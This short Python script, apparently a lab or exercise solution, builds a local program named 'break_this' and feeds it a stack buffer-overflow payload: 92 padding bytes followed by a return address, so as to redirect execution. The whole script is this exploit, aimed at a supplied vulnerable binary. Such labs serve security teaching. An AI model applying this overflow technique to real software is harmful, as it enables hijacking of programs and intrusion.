# SPDX-License-Identifier: BSD-3-Clause
import subprocess


def run_executable():
    subprocess.run(["make"], check=True, cwd="../support")
    number = "100"
    message = "A" * 92 + "\x96\x85\x04\x08"
    payload = number + "\n" + message
    subprocess.run(["../support/break_this"], input=payload, universal_newlines=True)
    subprocess.run(["make", "clean"], check=True, cwd="../support")


if __name__ == "__main__":
    run_executable()
